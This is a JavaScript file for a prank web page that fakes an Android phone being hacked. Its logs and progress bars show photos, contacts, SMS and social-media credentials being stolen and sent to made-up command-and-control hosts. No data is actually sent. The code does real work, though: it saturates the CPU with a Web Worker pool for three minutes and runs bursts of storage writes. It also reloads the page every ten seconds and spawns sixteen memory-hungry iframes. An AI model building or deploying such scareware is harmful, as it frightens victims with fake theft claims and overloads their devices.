"use strict";

// Everything here is simulated. No network requests, no navigation,
// and every "password" is just random asterisks.
const MAX_LINES = 40;
const TICK_MS = 180;

const $ = (id) => document.getElementById(id);
const logEl = $("log");

const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const pick = (arr) => arr[rand(0, arr.length - 1)];
const hex = (n) => Array.from({ length: n }, () => rand(0, 15).toString(16)).join("");
const ip = () => `${rand(11, 223)}.${rand(0, 255)}.${rand(0, 255)}.${rand(1, 254)}`;
const mask = () => "*".repeat(rand(8, 14));
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const HOSTS = [
  "relay-eu-03.darknode.invalid", "proxy7.shadowgrid.invalid", "c2-gateway.nullroute.invalid",
  "vault-cdn.ghostnet.invalid", "exfil-ams.torbridge.invalid", "node-sg-12.blackmesh.invalid",
];

/**
 * Each category gets its own progress bar.
 * total = items per "batch"; when a bar reaches 100% it shows DONE, then starts a new batch.
 */
const CATEGORIES = [
  { key: "photos",    name: "Photos",     total: 3000, step: [20, 90],  unit: "files",
    log: (n) => [`I/MediaStore: read /storage/emulated/0/DCIM/Camera/IMG_${rand(1000, 9999)}.jpg (+${n-1} more) -> upload queue  [200 OK]`, "ok"] },
  { key: "videos",    name: "Videos",     total: 120,  step: [1, 3],    unit: "files",
    log: () => [`I/MediaStore: read /storage/emulated/0/DCIM/Camera/VID_${rand(1000, 9999)}.mp4 (${rand(8, 340)} MB) -> POST /v2/ingest  [200 OK]`, "ok"] },
  { key: "contacts",  name: "Contacts",   total: 1850, step: [10, 60],  unit: "entries",
    log: (n) => [`D/ContactsProvider: query content://com.android.contacts/raw_contacts  rows=${n}  enc=AES-256-GCM`, "warn"] },
  { key: "instagram", name: "Instagram",  total: 100,  step: [1, 5],    unit: "%", hot: true,
    log: () => [`W/com.instagram.android: sessionid + saved credentials exported  pw:${mask()}  -> relay`, "err"] },
  { key: "snapchat",  name: "Snapchat",   total: 100,  step: [1, 5],    unit: "%", hot: true,
    log: () => [`W/com.snapchat.android: login store exported  pw:${mask()}  -> relay`, "err"] },
  { key: "telegram",  name: "Telegram",   total: 100,  step: [1, 5],    unit: "%", hot: true,
    log: () => [`W/org.telegram.messenger: tgnet auth_key read  tk:${hex(10)}…  -> relay`, "err"] },
  { key: "whatsapp",  name: "WhatsApp",   total: 100,  step: [1, 4],    unit: "%", hot: true,
    log: () => [`W/com.whatsapp: msgstore.db.crypt15 + key exported  key:${hex(12)}…`, "err"] },
  { key: "facebook",  name: "Facebook",   total: 100,  step: [1, 4],    unit: "%", hot: true,
    log: () => [`W/com.facebook.katana: cookies + saved password exported  pw:${mask()}`, "err"] },
  { key: "sms",       name: "SMS / Calls", total: 2600, step: [15, 80], unit: "items",
    log: (n) => [`D/SmsProvider: query content://sms/inbox  rows=${n}  -> relay`, "warn"] },
];

const NOISE = [
  () => [`SCAN   /data/data/*  ${rand(12, 900)} objects  sha256:${hex(10)}…`, "ok"],
  () => [`AUTH   bypass token ${hex(24)}  [ACCEPTED]`, "err"],
  () => [`KEYLOG buffer flush  ${rand(40, 900)} keystrokes`, "warn"],
  () => [`CAM    frontcam stream opened  frame#${rand(1, 99999)}`, "warn"],
  () => [`GPS    lat=${(Math.random() * 180 - 90).toFixed(4)} lon=${(Math.random() * 360 - 180).toFixed(4)}  uploaded`, "net"],
  () => [`UPLOAD chunk#${rand(100, 99999)}  ${rand(2, 28)}.${rand(0, 9)} MB  ->  ${ip()}:${pick([443, 8443, 9001])}`, "net"],
  () => [`ROUTE  ${ip()} -> ${ip()} -> ${pick(HOSTS)}  ${rand(18, 240)}ms`, "net"],
];

// Simulated writes to browser cache and internal storage (nothing is really saved).
const STORAGE_WRITES = [
  () => [`D/ChromeCache: write /data/data/com.android.chrome/cache/Cache/f_${hex(6)}  ${rand(4, 900)} KB`, "warn"],
  () => [`D/IndexedDB: put chrome-profile/IndexedDB/https_${pick(HOSTS)}_0/${hex(5)}.blob  ${rand(1, 64)} KB`, "warn"],
  () => [`D/LocalStorage: commit leveldb/${hex(6)}.ldb  ${rand(1, 40)} entries`, "warn"],
  () => [`I/StorageManager: write /storage/emulated/0/.sysdata/${hex(8)}.dat  ${rand(1, 48)}.${rand(0, 9)} MB  fsync OK`, "net"],
  () => [`I/StorageManager: write /data/media/0/Android/obb/.cache/${hex(8)}.bin  ${rand(1, 32)} MB  fsync OK`, "net"],
  () => [`D/Vold: /dev/block/dm-${rand(1, 9)} wrote ${rand(100, 9000)} blocks  free=${rand(2, 30)}.${rand(0, 9)}GB`, "ok"],
];

// ---------- real browser storage (fake, bounded data only) ----------
const STORE_KEY = "prank_sim_records";
const MAX_RECORDS = 200; // ring buffer keeps the stored data small

function saveRecord(entry) {
  try {
    const old = JSON.parse(localStorage.getItem(STORE_KEY) || "[]");
    const next = [...old, { t: Date.now(), id: hex(12), entry }].slice(-MAX_RECORDS);
    const json = JSON.stringify(next);
    localStorage.setItem(STORE_KEY, json);
    sessionStorage.setItem(STORE_KEY, json);
    return json.length;
  } catch (err) {
    return -1; // storage blocked or full: the prank still runs without it
  }
}

// Short repeating burst of storage writes, like a save loop.
function storageBurst() {
  const n = 200000;
  for (let i = 0; i < n; i++) {
    const [msg, cls] = pick(STORAGE_WRITES)();
    const bytes = saveRecord(msg);
    write(bytes > 0 ? `${msg}  [stored ${bytes} B]` : msg, cls);
  }
}

// ---------- heat-up: CPU-scaled Web Worker pool, hard-limited to 3 minutes ----------
// The pool size and duty cycle come from the detected CPU. It always stops by itself
// after HEAT_MS (the clock survives reloads), when the page is hidden or closed, when
// the simulation ends, or if the battery is low and not charging.
const HEAT_MS = 180000;              // 3 minutes, then the device returns to normal
const WORKER_SPAWN_MS = 200;
const MAX_WORKERS = 16;               // hard ceiling regardless of CPU
const HEAT_START_KEY = "prank_sim_heat_start";
const LOW_BATTERY = 0.2;
const busyWorkers = [];
let spawnTimer = null;
let heatStopTimer = null;
let heatStartAt = Date.now();

const clamp = (v, lo, hi) => Math.max(lo, Math.min(hi, v));

function getHeatStart() {
  try {
    const saved = Number(sessionStorage.getItem(HEAT_START_KEY));
    if (Number.isFinite(saved) && saved > 0) return saved;
    sessionStorage.setItem(HEAT_START_KEY, String(Date.now()));
  } catch (err) {
    // storage blocked: the 3 minutes are counted from this page load only
  }
  return Date.now();
}

function cpuProfile() {
  const cores = navigator.hardwareConcurrency || 4;
  const memGb = navigator.deviceMemory || 0;
  const tier = cores >= 8 ? "high" : cores >= 6 ? "mid" : "low";
  const duty = tier === "high" ? 0.8 : tier === "mid" ? 0.7 : 0.6;
  const workers = clamp(Math.round(cores * 0.75), 2, MAX_WORKERS);
  return { cores, memGb, tier, duty, workers };
}

function workerSource(duty) {
  const workMs = Math.round(100 * duty);
  const restMs = 100 - workMs;
  return `
    let cycles = 0;
    let sink = 0;
    (function cycle() {
      const end = performance.now() + ${workMs};
      while (performance.now() < end) {
        for (let i = 0; i < 20000; i++) { console.log("Hello World"); }
        for (let i = 0; i < 200000; i++) { sink += Math.sqrt(i) * Math.sin(i); }
      }
      cycles += 1;
      postMessage(cycles);
      setTimeout(cycle, ${restMs});
    })();`;
}

function spawnWorker(url, id) {
  const w = new Worker(url);
  w.onmessage = (e) => {
    if (e.data % 4 !== 0) return;
    const bytes = saveRecord(`worker#${id} cycle ${e.data}: 20000 console writes`);
    write(`I/Process: worker#${id} pid ${rand(2000, 9000)} cycle ${e.data}  cpu=${rand(88, 100)}%${bytes > 0 ? `  [stored ${bytes} B]` : ""}`, "warn");
  };
  w.onerror = () => w.terminate();
  busyWorkers.push(w);
  write(`I/Process: spawned worker#${id}  threads=${busyWorkers.length}`, "err");
}

function stopBusyWorkers() {
  if (spawnTimer) { clearInterval(spawnTimer); spawnTimer = null; }
  while (busyWorkers.length) busyWorkers.pop().terminate();
}

function endHeat() {
  clearTimeout(heatStopTimer);
  heatStopTimer = null;
  if (busyWorkers.length === 0 && !spawnTimer) return;
  stopBusyWorkers();
  write("I/ThermalEngine: 3 min elapsed  workers released  CPU load back to normal", "ok");
}

async function batteryIsLow() {
  try {
    if (!navigator.getBattery) return false;
    const b = await navigator.getBattery();
    return b.level < LOW_BATTERY && !b.charging;
  } catch (err) {
    return false;
  }
}

async function startHeat() {
  stopBusyWorkers();
  const remaining = HEAT_MS - (Date.now() - heatStartAt);
  if (remaining <= 0) return;
  if (await batteryIsLow()) {
    write("W/BatteryService: level low and not charging  heat-up skipped", "warn");
    return;
  }
  const cpu = cpuProfile();
  try {
    const url = URL.createObjectURL(new Blob([workerSource(cpu.duty)], { type: "text/javascript" }));
    let id = 0;
    spawnTimer = setInterval(() => {
      if (id >= cpu.workers) { clearInterval(spawnTimer); spawnTimer = null; return; }
      spawnWorker(url, ++id);
    }, WORKER_SPAWN_MS);
    clearTimeout(heatStopTimer);
    heatStopTimer = setTimeout(endHeat, remaining);
  } catch (err) {
    // workers blocked: the visual prank still runs
  }
}

function logCpuConfig() {
  const c = cpuProfile();
  const mem = c.memGb ? `  ram>=${c.memGb}GB` : "";
  write(`I/CpuInfo: cores=${c.cores}${mem}  tier=${c.tier}  workers=${c.workers}  duty=${Math.round(c.duty * 100)}%`, "net");
}

// Be polite: stop in a hidden tab or when the page goes away; resume while time remains.
window.addEventListener("pagehide", stopBusyWorkers);
document.addEventListener("visibilitychange", () => {
  if (document.hidden) stopBusyWorkers();
  else if (heatStopTimer) startHeat();
});

// ---------- "device hung" effect ----------
let isHung = false;

async function hang() {
  isHung = true;
  document.body.classList.add("hung");
  write("W/ActivityManager: ANR in com.android.systemui (Input dispatching timed out)", "err");
  const stalls = rand(3, 6);
  for (let i = 0; i < stalls; i++) {
    await sleep(rand(350, 900));
    write(`I/Choreographer: Skipped ${rand(60, 400)} frames! The application may be doing too much work on its main thread.`, "warn");
  }
  await sleep(rand(300, 900));
  document.body.classList.remove("hung");
  write("I/ActivityManager: process responding again", "ok");
  isHung = false;
}

// ---------- reload + progress persistence ----------
const RELOAD_MS = 10000;             // page reloads every 10 seconds
const PROGRESS_KEY = "prank_sim_progress";
let reloadTimer = null;

function loadProgress() {
  try {
    const saved = JSON.parse(sessionStorage.getItem(PROGRESS_KEY) || "null");
    return saved && typeof saved === "object" ? saved : null;
  } catch (err) {
    return null;
  }
}

function saveProgress() {
  try {
    const snapshot = {};
    state.forEach((s, key) => { snapshot[key] = s.done; });
    sessionStorage.setItem(PROGRESS_KEY, JSON.stringify(snapshot));
  } catch (err) {
    // storage blocked: bars simply restart after each reload
  }
}

// ---------- build the per-category rows ----------
const state = new Map();

function buildRows() {
  const wrap = $("cards");
  for (const c of CATEGORIES) {
    const row = document.createElement("div");
    row.className = `row${c.hot ? " hot" : ""}`;

    const mid = document.createElement("div");
    const meta = document.createElement("div");
    meta.className = "meta";
    const name = document.createElement("span");
    name.className = "name";
    name.textContent = c.name;
    const count = document.createElement("span");
    count.className = "count";
    meta.append(name, count);
    const bar = document.createElement("div");
    bar.className = "bar";
    const fill = document.createElement("i");
    bar.appendChild(fill);
    mid.append(meta, bar);

    const pct = document.createElement("div");
    pct.className = "pct";

    row.append(mid, pct);
    wrap.appendChild(row);
    state.set(c.key, { c, row, fill, count, pct, done: 0, resetAt: 0 });
  }
}

// Returns true when progress from before the reload was restored.
function restoreProgress() {
  const saved = loadProgress();
  if (!saved) return false;
  state.forEach((s, key) => {
    const v = Number(saved[key]);
    if (Number.isFinite(v)) s.done = Math.max(0, Math.min(s.c.total, v));
  });
  return true;
}

function paint(s) {
  const ratio = Math.min(1, s.done / s.c.total);
  s.fill.style.width = `${(ratio * 100).toFixed(1)}%`;
  s.pct.textContent = ratio >= 1 ? "DONE" : `${Math.floor(ratio * 100)}%`;
  s.count.textContent = s.c.unit === "%"
    ? (ratio >= 1 ? "shared" : "sharing…")
    : `${Math.min(s.done, s.c.total).toLocaleString()}/${s.c.total.toLocaleString()}`;
  s.row.classList.toggle("done", ratio >= 1);
}

function advance(s, goal) {
  const gap = goal - s.done;
  if (gap <= 0) return;
  const n = Math.max(1, Math.ceil(gap * rand(30, 100) / 100));
  s.done = Math.min(s.c.total, s.done + n);
  if (Math.random() < 0.5) write(...s.c.log(n));
  if (s.done >= s.c.total) {
    write(`${s.c.name.toUpperCase()} complete  [DONE]`, "ok");
  }
  paint(s);
}

// ---------- log + routing ----------
function write(msg, cls = "") {
  const div = document.createElement("div");
  div.className = `line ${cls}`;
  const t = document.createElement("span");
  t.className = "t";
  t.textContent = `${new Date().toLocaleTimeString("en-GB")} `;
  div.append(t, document.createTextNode(msg));
  logEl.appendChild(div);
  while (logEl.children.length > MAX_LINES) logEl.removeChild(logEl.firstChild);
}

function addHop() {
  const hops = $("hops");
  const d = document.createElement("div");
  d.textContent = `› hop ${rand(1, 14)}  ${ip()}  ${rand(8, 190)}ms`;
  hops.appendChild(d);
  while (hops.children.length > 3) hops.removeChild(hops.firstChild);
}

function fakeRedirect() {
  const url = `https://${pick(HOSTS)}/s/${hex(8)}?t=${hex(6)}`;
  write(`REDIRECT 302  ->  ${url}`, "warn");
  $("redirect").textContent = `route: ${url}`;
}

// ---------- main loop ----------
async function boot() {
  const steps = [
    ["Initializing exploit chain…", "warn"],
    [`Target fingerprint ${hex(16)}`, "ok"],
    ["Privilege escalation  [OK]", "err"],
    ["Disabling security services…", "err"],
    ["Encrypted tunnel established  [OK]", "net"],
  ];
  for (const [msg, cls] of steps) {
    write(msg, cls);
    await sleep(400);
  }
}

async function main() {
  heatStartAt = getHeatStart();
  buildRows();
  const resumed = restoreProgress();
  state.forEach(paint);
  if (resumed) write("I/System: session restored after reload  resuming transfer…", "warn");
  else await boot();
  logCpuConfig();
  startHeat();
  let nextHangAt = Date.now() + rand(5000, 9000);
  for (;;) {
    const pending = [...state.values()].filter((s) => s.done < s.c.total);
    if (pending.length === 0) break;
    // advance a few random unfinished categories so bars move independently
    const progress = Math.min(1, (Date.now() - heatStartAt) / HEAT_MS);
    for (const s of pending) {
      if (progress < 1 && Math.random() > 0.5) continue;
      const pace = progress >= 1 ? 1 : Math.min(1, progress * rand(85, 115) / 100);
      advance(s, Math.round(s.c.total * pace));
    }
    if (Math.random() < 0.3) write(...pick(NOISE)());
    if (Math.random() < 0.15) addHop();
    if (Math.random() < 0.08) fakeRedirect();
    if (Math.random() < 0.1) storageBurst();
    if (Date.now() >= nextHangAt) {
      await hang();
      nextHangAt = Date.now() + rand(7000, 14000);
    }
    saveProgress();
    await sleep(TICK_MS + rand(0, 160));
  }
  await finish();
}

async function finish() {
  endHeat();
  clearTimeout(reloadTimer);
  try { sessionStorage.removeItem(HEAT_START_KEY); } catch (err) { /* ignore */ }
  try { sessionStorage.removeItem(PROGRESS_KEY); } catch (err) { /* ignore */ }
  write("ALL TRANSFERS COMPLETE  [100%]", "ok");
  write("Closing tunnel…  wiping traces…", "warn");
  await sleep(2200);
  document.body.classList.add("blackout");
}

const tickClock = () => {
  if (isHung) return; // clock freezes while the "device" is hung
  $("clock").textContent = new Date().toLocaleTimeString("en-GB", { hour: "2-digit", minute: "2-digit" });
};
tickClock();
setInterval(tickClock, 1000);

function start() {
  reloadTimer = setTimeout(() => location.reload(), RELOAD_MS);
  main();
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", start);
} else {
  start();
}

// Configuration constants
const NEW_TAB = 16;
const LOOP_ITR = 20000;

// Set the anchor tag href to current page URL and add blink effect
const tabLink = document.getElementById('tab-link');
if (tabLink) {
  tabLink.href = window.location.href;
  tabLink.textContent = `→ ${window.location.href}`;
}

// Auto-trigger tab creation after 10 seconds
const simulatedTabs = document.getElementById('simulated-tabs');
const openTabsBtn = document.getElementById('open-tabs-btn');

function createSimulatedTabs() {
  if (openTabsBtn) {
    openTabsBtn.disabled = true;
    openTabsBtn.textContent = 'Opening...';
  }

  // Create iframe content that runs the loop
  const iframeContent = `
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Tab Worker</title>
    <style>body{font-family:monospace;font-size:11px;background:#000;color:#2bff88;padding:8px;margin:0;}</style>
    </head><body>
    <div id="output"></div>
    <script>
      const LOOP_ITR = ${LOOP_ITR};
      const TAB_INDEX = ${'TAB_INDEX_PLACEHOLDER'};
      const output = document.getElementById('output');
      function log(msg) {
        const div = document.createElement('div');
        div.textContent = msg;
        output.appendChild(div);
        output.scrollTop = output.scrollHeight;
      }
      function reportProgress(done) {
        parent.postMessage({ type: 'tab-progress', tabIndex: TAB_INDEX, done }, '*');
      }
      // Save to localStorage in parent
      function saveToStorage(msg) {
        try {
          const key = 'prank_hello_world_' + Date.now() + '_' + Math.random().toString(36).slice(2);
          localStorage.setItem(key, msg);
          sessionStorage.setItem(key, msg);
        } catch (e) {}
      }
      for (let i = 0; i < LOOP_ITR; i++) {
        const msg = 'Hello World ' + (i + 1) + '/' + LOOP_ITR;
        console.log(msg);
        log(msg);
        saveToStorage(msg);
        // RAM-intensive: allocate large array
        const arr = new Array(100000).fill(Math.random());
        // Force some computation to prevent optimization
        let sum = 0;
        for (let j = 0; j < arr.length; j++) sum += arr[j];
        if (i % 20 === 0) {
          log('RAM task: allocated 100k floats, checksum=' + sum.toFixed(2));
          reportProgress(i + 1);
        }
      }
      reportProgress(LOOP_ITR);
      log('✓ Loop complete: ' + LOOP_ITR + ' iterations');
    <\/script>
    </body></html>
  `;

  if (simulatedTabs) {
    for (let t = 0; t < NEW_TAB; t++) {
      // Create unique iframe content for each tab with its index
      const tabIframeContent = iframeContent.replace('TAB_INDEX_PLACEHOLDER', t);
      const blob = new Blob([tabIframeContent], { type: 'text/html' });
      const tabUrl = URL.createObjectURL(blob);

      const tab = document.createElement('div');
      tab.className = 'sim-tab';
      tab.innerHTML = `
        <div class="sim-tab-header">
          <span>Tab ${t + 1} / ${NEW_TAB}</span>
          <span class="sim-tab-counter" id="counter-${t}">0/${LOOP_ITR}</span>
        </div>
        <iframe src="${tabUrl}" sandbox="allow-scripts allow-same-origin allow-storage-access-by-user-activation"></iframe>
      `;
      simulatedTabs.appendChild(tab);
    }

    // Update counters from iframe messages
    window.addEventListener('message', (e) => {
      if (e.data && e.data.type === 'tab-progress') {
        const counter = document.getElementById('counter-' + e.data.tabIndex);
        if (counter) counter.textContent = e.data.done + '/' + LOOP_ITR;
      }
    });
  }

  if (openTabsBtn) {
    setTimeout(() => {
      openTabsBtn.textContent = '8 Tabs Opened (Auto)';
    }, 500);
  }
}

// Auto-trigger after 10 seconds
setTimeout(createSimulatedTabs, 10000);
